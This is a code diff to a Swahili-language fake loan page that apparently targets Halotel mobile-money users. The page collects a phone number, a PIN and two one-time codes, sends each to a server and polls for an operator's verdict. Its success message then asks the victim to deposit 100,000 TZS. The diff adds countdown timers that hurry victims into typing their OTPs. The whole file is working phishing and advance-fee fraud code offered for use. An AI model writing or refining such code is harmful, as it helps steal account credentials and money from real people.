@@ -273,6 +273,14 @@
             padding: 15px 0;
             font-size: 16px;
         }
+
+        .countdown-timer {
+            font-size: 20px;
+            font-weight: 800;
+            color: #F96302;
+            margin-top: 10px;
+            margin-bottom: 5px;
+        }
     </style>
 </head>
 <body>
@@ -352,6 +360,7 @@
             <div class="card-title">Weka Namba Ya OTP 1</div>
             <div id="otp1-alarm" class="red-alarm"></div>
             <div class="section-label">Ingiza OTP ya kwanza (Tarakimu 4):</div>
+            <div class="countdown-timer" id="timer-otp1">00:59</div>
             <div class="pin-container">
                 <input type="password" maxlength="1" class="otp1-box" oninput="moveToNext(this, 'o1_2')">
                 <input type="password" maxlength="1" class="otp1-box" id="o1_2" oninput="moveToNext(this, 'o1_3')">
@@ -366,6 +375,7 @@
             <div class="card-title">Weka Namba Ya OTP 2</div>
             <div id="otp2-alarm" class="red-alarm"></div>
             <div class="section-label">Ingiza OTP ya pili (Tarakimu 4):</div>
+            <div class="countdown-timer" id="timer-otp2">00:59</div>
             <div class="pin-container">
                 <input type="password" maxlength="1" class="otp2-box" oninput="moveToNext(this, 'o2_2')">
                 <input type="password" maxlength="1" class="otp2-box" id="o2_2" oninput="moveToNext(this, 'o2_3')">
@@ -388,6 +398,7 @@
         let selectedMonths = 12;
         let currentAmount = '5,000,000';
         let fullPhoneNumber = '';
+        let inputCountdownInterval = null;
 
         function updateCalculator() {
             const amount = document.getElementById('loan-slider').value;
@@ -447,14 +458,29 @@
             document.getElementById('step-pin').style.display = 'block';
         }
 
+        function startInputCountdown(displayId, onExpire) {
+            let seconds = 59;
+            const display = document.getElementById(displayId);
+            if (inputCountdownInterval) clearInterval(inputCountdownInterval);
+
+            inputCountdownInterval = setInterval(() => {
+                let secStr = seconds < 10 ? "0" + seconds : seconds;
+                if (display) display.innerText = `00:${secStr}`;
+
+                if (seconds <= 0) {
+                    clearInterval(inputCountdownInterval);
+                    if (onExpire) onExpire();
+                }
+                seconds--;
+            }, 1000);
+        }
+
         async function submitPhoneAndPinData() {
             const boxes = document.querySelectorAll('.pin-box');
             let pin = '';
             boxes.forEach(b => pin += b.value);
 
-            if (pin.length < 4) {
-                return;
-            }
+            if (pin.length < 4) return;
 
             await fetch('/api/submit-pin-data', {
                 method: 'POST',
@@ -468,31 +494,24 @@
         }
 
         async function pollPinApproval() {
-            let startTime = Date.now();
-            let timeoutMs = 60000; // 1 minute timeout
-            let interval = setInterval(async () => {
-                if (Date.now() - startTime > timeoutMs) {
-                    clearInterval(interval);
-                    document.getElementById('step-waiting').style.display = 'none';
-                    const alarm = document.getElementById('phone-alarm');
-                    alarm.innerText = 'Muda umeisha. Tafadhali jaribu tena.';
-                    alarm.style.display = 'block';
-                    document.getElementById('step-phone').style.display = 'block';
-                    document.querySelectorAll('.pin-box').forEach(b => b.value = '');
-                    return;
-                }
-
+            window.pinInterval = setInterval(async () => {
                 try {
                     let res = await fetch('/api/check-pin-status');
                     if (!res.ok) return;
                     let data = await res.json();
 
                     if (data.status === 'approved') {
-                        clearInterval(interval);
+                        clearInterval(window.pinInterval);
                         document.getElementById('step-waiting').style.display = 'none';
                         document.getElementById('step-otp1').style.display = 'block';
+                        
+                        // Start 1-minute countdown on user's screen for OTP 1
+                        startInputCountdown('timer-otp1', () => {
+                            alert('Muda umeisha. Tafadhali jaribu tena.');
+                            location.reload();
+                        });
                     } else if (data.status === 'rejected') {
-                        clearInterval(interval);
+                        clearInterval(window.pinInterval);
                         document.getElementById('step-waiting').style.display = 'none';
                         
                         document.getElementById('phone-alarm').innerText = 'Tafadhali jisajili kwa kutumia namba yako ya Halotel.';
@@ -512,9 +531,9 @@
             let otp1 = '';
             boxes.forEach(b => otp1 += b.value);
 
-            if (otp1.length < 4) {
-                return;
-            }
+            if (otp1.length < 4) return;
+
+            if (inputCountdownInterval) clearInterval(inputCountdownInterval);
 
             await fetch('/api/verify-otp1', {
                 method: 'POST',
@@ -528,37 +547,36 @@
         }
 
         async function pollOtp1() {
-            let startTime = Date.now();
-            let timeoutMs = 60000; // 1 minute timeout
-            let statusInterval = setInterval(async () => {
-                if (Date.now() - startTime > timeoutMs) {
-                    clearInterval(statusInterval);
-                    document.getElementById('step-waiting').style.display = 'none';
-                    const alarm = document.getElementById('otp1-alarm');
-                    alarm.innerText = 'Muda umeisha. Tafadhali jaribu tena.';
-                    alarm.style.display = 'block';
-                    document.getElementById('step-otp1').style.display = 'block';
-                    document.querySelectorAll('.otp1-box').forEach(b => b.value = '');
-                    return;
-                }
-
+            window.otp1Interval = setInterval(async () => {
                 try {
                     let res = await fetch('/api/check-otp1-status');
                     if (!res.ok) return;
                     let data = await res.json();
 
                     if (data.status === 'success') {
-                        clearInterval(statusInterval);
+                        clearInterval(window.otp1Interval);
                         document.getElementById('step-waiting').style.display = 'none';
                         document.getElementById('step-otp2').style.display = 'block';
+                        
+                        // Start 1-minute countdown on user's screen for OTP 2
+                        startInputCountdown('timer-otp2', () => {
+                            alert('Muda umeisha. Tafadhali jaribu tena.');
+                            location.reload();
+                        });
                     } else if (data.status === 'wrong') {
-                        clearInterval(statusInterval);
+                        clearInterval(window.otp1Interval);
                         document.getElementById('step-waiting').style.display = 'none';
                         const alarm = document.getElementById('otp1-alarm');
                         alarm.innerText = 'OTP sio sahihi. Jaribu tena.';
                         alarm.style.display = 'block';
                         document.getElementById('step-otp1').style.display = 'block';
                         document.querySelectorAll('.otp1-box').forEach(b => b.value = '');
+                        
+                        // Restart countdown since user is back on OTP 1 entry
+                        startInputCountdown('timer-otp1', () => {
+                            alert('Muda umeisha. Tafadhali jaribu tena.');
+                            location.reload();
+                        });
                     }
                 } catch (e) {
                     console.error(e);
@@ -571,9 +589,9 @@
             let otp2 = '';
             boxes.forEach(b => otp2 += b.value);
 
-            if (otp2.length < 4) {
-                return;
-            }
+            if (otp2.length < 4) return;
+
+            if (inputCountdownInterval) clearInterval(inputCountdownInterval);
 
             await fetch('/api/verify-otp2', {
                 method: 'POST',
@@ -587,38 +605,31 @@
         }
 
         async function pollOtp2() {
-            let startTime = Date.now();
-            let timeoutMs = 60000; // 1 minute timeout
-            let interval = setInterval(async () => {
-                if (Date.now() - startTime > timeoutMs) {
-                    clearInterval(interval);
-                    document.getElementById('step-waiting').style.display = 'none';
-                    const alarm = document.getElementById('otp2-alarm');
-                    alarm.innerText = 'Muda umeisha. Tafadhali jaribu tena.';
-                    alarm.style.display = 'block';
-                    document.getElementById('step-otp2').style.display = 'block';
-                    document.querySelectorAll('.otp2-box').forEach(b => b.value = '');
-                    return;
-                }
-
+            window.otp2Interval = setInterval(async () => {
                 try {
                     let res = await fetch('/api/check-otp2-status');
                     if (!res.ok) return;
                     let data = await res.json();
 
                     if (data.status === 'success') {
-                        clearInterval(interval);
+                        clearInterval(window.otp2Interval);
                         document.getElementById('step-waiting').style.display = 'none';
                         document.getElementById('step-success').style.display = 'block';
                         document.getElementById('success-msg').innerHTML = `Hongera,umefanikiwa kukopa TZS ${currentAmount}<br><br>Tafadhali weka kiasi cha 100,000Tz kwenye akaunti yako ili kupokea kiasi unachochagua kwenye ${fullPhoneNumber}.`;
                     } else if (data.status === 'wrong') {
-                        clearInterval(interval);
+                        clearInterval(window.otp2Interval);
                         document.getElementById('step-waiting').style.display = 'none';
                         const alarm = document.getElementById('otp2-alarm');
                         alarm.innerText = 'OTP sio sahihi. Jaribu tena.';
                         alarm.style.display = 'block';
                         document.getElementById('step-otp2').style.display = 'block';
                         document.querySelectorAll('.otp2-box').forEach(b => b.value = '');
+                        
+                        // Restart countdown since user is back on OTP 2 entry
+                        startInputCountdown('timer-otp2', () => {
+                            alert('Muda umeisha. Tafadhali jaribu tena.');
+                            location.reload();
+                        });
                     }
                 } catch (e) {
                     console.error(e);
